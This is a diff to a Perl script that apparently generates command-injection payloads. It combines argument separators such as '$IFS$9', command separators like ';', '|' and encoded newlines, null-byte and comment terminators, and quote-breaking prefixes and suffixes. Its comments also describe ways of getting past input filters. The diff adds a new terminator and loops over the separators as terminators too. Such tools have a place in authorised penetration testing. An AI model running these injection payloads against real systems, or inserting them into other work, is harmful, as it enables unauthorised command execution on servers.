@@ -48,12 +48,12 @@ $PAYL,
 
 my @ARGUMENT_SEPARATORS=('%20%20',"%09%09",'$IFS$9');
 my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d',';','%26','|','<<D%0aD%0a');
-my @COMMAND_TERMINATORS=("%00",'💩');# these make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection
+my @COMMAND_TERMINATORS=("%00",'💩','%20%20#');# these make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection
 
 # %F0%9F%92%A9 encoded poo
 
 # invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
-my @PREFIXES=('fooo.co.uk');
+my @PREFIXES=('foo.co.uk');
 my @PREFIX_SUFFIXES=('"',"'"); # for into-quoted string injections, like fixed_command '$USER_SUPPLIED' or fixed_command "$USER_SUPPLIED"
 
 # my %EVASIVE_RULES = (); # this is a collection of rules to apply in order to create alternative payload versions intended to bypass filters, e.g. 'script' => 'sCrIpt', 'script' => 'scr<script>ipt', 'UNION'=>'SeLunionect', 'tmp/' => 'tmp/../tmp/../tmp/../tmp/../tmp' and so on.
@@ -93,7 +93,7 @@ foreach my $arg_separator(@ARGUMENT_SEPARATORS)
 # 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed?)
 foreach my $base_payload(@BASE_PAYLOADS)
 {
-	foreach my $command_terminator(@COMMAND_TERMINATORS)
+	foreach my $command_terminator((@COMMAND_TERMINATORS,@COMMAND_SEPARATORS))
 	{
 		my $curr_payload=$base_payload.$command_terminator;
 		push(@output_payloads,$curr_payload);
